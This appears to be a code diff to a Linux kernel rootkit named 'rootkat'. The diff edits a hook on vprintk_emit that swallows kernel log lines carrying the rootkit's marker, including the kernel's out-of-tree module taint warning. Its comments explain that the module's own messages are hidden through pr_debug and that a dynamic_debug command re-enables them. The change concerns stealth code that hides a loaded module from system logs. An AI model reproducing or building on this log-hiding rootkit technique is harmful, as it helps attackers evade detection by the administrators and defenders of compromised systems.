@@ -25,28 +25,28 @@ static int rootkat_vprintk_emit(int facility, int level,
                                 const char *fmt, va_list args);
 
 static struct rootkat_hook hook_vprintk_emit = {
-	.candidates          = vprintk_emit_candidates,
-	.replacement         = rootkat_vprintk_emit,
-	/* Filter rootkat.ko's own pr_info calls — that's the whole point
-	 * here, so we explicitly opt out of the within_module recursion
-	 * guard. vsnprintf + strnstr in our replacement don't recurse into
-	 * vprintk_emit, so there's no actual loop hazard. */
-	.intercept_own_calls = true,
+	.candidates  = vprintk_emit_candidates,
+	.replacement = rootkat_vprintk_emit,
 };
 
 /*
- * Format the message into a per-CPU stack buffer, scan for the marker,
- * drop on match. va_copy the args first so the original list stays
- * usable for the orig call when we don't drop.
+ * Format the message into a stack buffer, scan for the marker, drop
+ * on match. va_copy the args first so the original list stays usable
+ * for the orig call when we pass through.
  *
- * 256 bytes covers the vast majority of kernel printks; longer
- * messages get truncated for the marker check, which is fine because
- * the marker prefix sits at the start of every rootkat line ("rootkat:
- * ...", "rootkat/...:", etc.) — well within the first 64 bytes.
+ * 256 bytes covers the vast majority of kernel printks; longer messages
+ * get truncated for the marker check, which is fine because the marker
+ * sits at the start of any "rootkat" line.
  *
- * Recursion safety: if our filter call ever printk's (it doesn't —
- * vsnprintf + strstr only), the ftrace thunk's within_module guard
- * would catch it. Format-only path here keeps this strictly pure.
+ * The ftrace within_module recursion guard means this hook ONLY fires
+ * for kernel-originated calls — calls from inside rootkat.ko itself
+ * skip our replacement and run the original directly. So this filter
+ * catches things like the kernel's "<mod>: loading out-of-tree module
+ * taints kernel" warning (where mod->name is "rootkat") but NOT our
+ * own pr_info lines. Those are silenced at compile time via pr_debug,
+ * which dynamic_debug suppresses by default. To re-enable for
+ * debugging:
+ *     echo 'module rootkat +p' > /sys/kernel/debug/dynamic_debug/control
  */
 static int rootkat_vprintk_emit(int facility, int level,
                                 const struct dev_printk_info *dev_info,
